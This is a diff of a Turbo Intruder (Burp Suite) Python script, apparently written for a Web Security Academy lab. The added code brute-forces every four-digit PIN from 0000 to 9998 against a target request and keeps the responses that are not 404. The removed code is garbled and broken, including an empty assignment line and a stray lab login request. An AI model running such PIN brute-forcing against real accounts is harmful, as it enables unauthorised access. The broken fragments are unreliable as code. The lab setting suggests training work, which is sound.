@@ -1,42 +1,17 @@
 def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint, # this is just a protocol:domain:port string like https://example.com:443
-                           concurrentConnections=5,
-                           requestsPerConnection=100,
-                           pipeline=False,
-                           maxQueueSize=10,
-                           timeout=5,
-                           maxRetriesPerRequest=3,
-                           autoStart=False
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=1000,
+                           engine=Engine.BURP, # Use Burp's HTTP/1 network stack, including upstream proxies etc. You can also use Engine.BURP2 for HTTP/2.
+                           pipeline=False
                            )
 
-    # We have to call engine.start() manually because we disabled autoStart
-    engine.start(timeout=5)
+    for pin in range(0,9999):
+        guess = str(pin).zfill(4)
+        engine.queue(target.req, guess)
 
-def login_process(req, interesting):
-    if 'name="csrf" value="' in req.response:
-         = 
-
-
-    login1a = """GET /login HTTP/1.1
-Host: 0a16004204188226c0aa3517009a008c.web-security-academy.net
-Connection: close
-
-"""
-
-
-
-
-
-
-
-
-    engine.queue(oddRequest)
-
-    for word in open('/usr/share/dict/words'):
-        engine.queue(target.req, word.rstrip())
-        
-        
 
 def handleResponse(req, interesting):
-    if '404 Not Found' not in req.response:
+    # currently available attributes are req.status, req.wordcount, req.length and req.response
+    if req.status != 404:
         table.add(req)
